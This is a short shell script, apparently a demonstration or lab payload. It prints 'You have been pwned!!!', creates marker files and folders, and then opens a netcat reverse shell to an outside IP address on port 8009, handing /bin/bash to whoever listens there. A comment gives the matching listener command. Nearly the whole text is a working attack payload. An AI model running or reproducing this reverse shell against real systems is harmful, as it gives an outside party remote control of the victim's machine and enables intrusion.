echo "You have been pwned!!!"

touch pwnedFolder
mkdir hackedFolder
cd hackedFolder
touch mario.exe


#nc –lvp 8009 to listen
nc 54.152.98.205 8009 -e /bin/bash